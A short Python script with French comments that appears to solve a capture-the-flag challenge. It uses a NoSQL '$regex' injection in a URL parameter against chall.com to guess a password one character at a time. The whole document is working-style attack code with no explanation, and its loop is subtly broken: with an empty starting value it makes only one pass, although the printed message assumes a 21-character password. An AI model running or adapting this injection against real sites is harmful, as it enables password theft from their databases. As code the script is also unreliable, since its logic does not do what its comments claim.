'''Trouver la lngueur du mot de passe:'''
#http://chall.com?param=[$regex]=.{i} -> faire varier i

import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@-+/()!\"$%=^[]:;"

flag = ""
for i in range(len(flag), -1, -1): #longueur du mot de passe
    print("[i] Looking for char number "+str(21-i))
    for char in alphabet:
        r = requests.get("http://chall.com?param=[$regex]="+flag+char+".{"+str(i)+"}")
        if ("True response" in r.text): #a modifier
            flag += char
            print("[+] Flag: "+flag)
            break
